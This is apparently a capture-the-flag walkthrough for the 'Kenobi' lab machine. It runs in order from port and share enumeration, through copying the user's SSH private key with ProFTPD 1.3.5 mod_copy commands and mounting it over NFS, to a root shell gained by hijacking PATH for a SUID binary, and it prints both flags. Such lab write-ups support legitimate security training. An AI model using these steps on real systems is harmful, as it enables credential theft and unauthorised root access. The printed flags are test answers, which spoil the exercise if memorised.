 Kenobi machine

 Ip address: 10.10.125.106 


 NMap port scan:

 nmap 10.10.125.106 -vvv



 PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
111/tcp  open  rpcbind      syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
2049/tcp open  nfs          syn-ack


Enumerating SMB shares:

nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.125.106


Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-03 12:03 EDT
Nmap scan report for 10.10.125.106
Host is up (0.070s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.125.106\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.125.106\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.125.106\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>


In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.125.106

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *


ProFTPD version: 1.3.5
nc 10.10.125.106 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.125.106]

Exploits  for ProFTPD 1.3.5:

searchsploit proftpd 1.3.5  

 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                                              | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                                    | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                                                                                                              | linux/remote/36742.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results



Copy kenobi private key using netcat connection:

nc 10.10.125.106 21

SITE CPFR /home/kenobi/.ssh/id_rsa

SITE CPTO /var/tmp/id_rsa
So we've now moved Kenobi's private key to the /var/tmp directory.



mount the /var/tmp directory to our machine:

mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS


Go to /var/tmp and get the private key then login to Kenobi's account:

cp /mnt/kenobiNFS/tmp/id_rsa .

Make id_rsa executable:

sudo chmod 600 id_rsa  

SSH into the machine using private key and uusername:kenobi

ssh -i id_rsa kenobi@10.10.125.106

Get Kenobi user flag:

cat user.txt
d0b0f3f53b6caa532a83915e19224899



SUID    files:

find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6


Escalate priviledge using /usr/bin/menu:

1st step: check menu functionality:

/usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :


2nd step: file runs as he root users privileges, manipulate path gain a root shell:

cd /tmp

echo /bin/bash > curl
chmod 777 curl
export PATH=/tmp:$PATH

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!

get root shell:

/usr/bin/menu

Root flaaaaaaaaaaag:

cd /root
cat root.txt
177b3cd8562289f37382721c28381f02
